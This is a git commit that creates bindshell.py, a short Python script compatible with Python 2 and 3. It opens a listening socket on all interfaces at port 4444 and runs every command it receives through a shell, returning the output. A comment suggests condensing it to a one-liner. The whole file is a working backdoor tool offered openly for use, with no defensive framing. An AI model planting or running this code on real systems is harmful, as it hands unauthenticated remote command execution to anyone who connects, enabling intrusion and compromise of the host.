685556f41212af8e4e93dc91b8d3d2b80b7fd23c
Reda El Hachloufi <34967978+666reda@users.noreply.github.com>
2021-01-15 13:41:18 +0100

    Create bindshell.py

---
+++ bindshell.py
@@ -0,0 +1,21 @@
+# Python bind shell compatible with both python2 and python3
+# use "http://jagt.github.io/python-single-line-convert/" to convert it to a on-liner
+import socket,os,subprocess
+c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.bind(('0.0.0.0', 4444))
+c.listen(1)
+s,a = c.accept()
+while True:
+    data = s.recv(1024)
+    if data.decode() == "quit": break
+    elif data.decode()[:2] == "cd":
+        try: os.chdir(data.decode()[3:])
+        except: pass
+    else:
+        proc = subprocess.Popen(data.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        stdoutput = proc.stdout.read() + proc.stderr.read()
+        stdoutput.decode()
+        s.sendall(stdoutput)
+    s.sendall('EOFX'.encode())
+s.send('Bye!'.encode())
+s.close()
